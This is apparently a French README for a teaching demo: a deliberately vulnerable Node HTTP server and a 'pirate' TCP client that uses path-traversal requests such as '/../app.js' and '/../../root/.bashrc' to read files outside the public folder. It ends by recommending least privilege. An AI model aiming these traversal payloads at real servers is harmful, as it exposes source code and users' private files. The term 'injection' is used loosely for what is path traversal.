# Démonstration d'une injection

Vous trouverez ici un serveur HTTP possédant une faille de sécurité : Une injection.

## Démarrer le serveur

1. Pour démarrer le serveur HTTP faites les commandes suivantes :

```bash
cd http-server-non-secure
node app.js 
```
## Démarrer le client pirate
2. Pour démarrer le client HTTP pirate, faites les commandes suivantes :

```bash
cd client-http-node
npm run start
```

Rendez-vous dans le code source du client http node. Pour voir comment est-ce que un client HTTP pirate a été fabriqué à partir d'un client TCP.

```js
new CustomHTTPRequest(3050, "127.0.0.1", "/../app.js");
```

## Quel à été l'attaque ?

**Le client TCP réussi à récupérer le code source du serveur alors qu'il se trouve en dehors du dossier public, ce qui constitue une faille de sécurité pour ce serveur.**

Pour ce faire, il effectue une injection (`"/../app.js"`) en prévoyant à l'avance le fait que readFile va effectuer une commande dans le file system Linux. 

Ici je récupère simplement le code source du serveur mais je pourrait aussi accéder au fichier personnel de l'utilisateur qui à lancer le server.

```js
new CustomHTTPRequest(3050, "127.0.0.1", "/../../../../../../../../../../../home/massinissa/.bashrc");
```

Parfois l'utilisateur root qui lance les programmes sur le serveur
```bash
cd http-server-non-secure
sudo node app.js 
```

A cause de cette faille je peux aussi accéder au dossier personnel du root.

```js
new CustomHTTPRequest(3050, "127.0.0.1", "/../../../../../../../../../../../root/.bashrc");
```

Faite donc très attention à toujours respecter la regle du Least Privileges : https://en.wikipedia.org/wiki/Principle_of_least_privilege
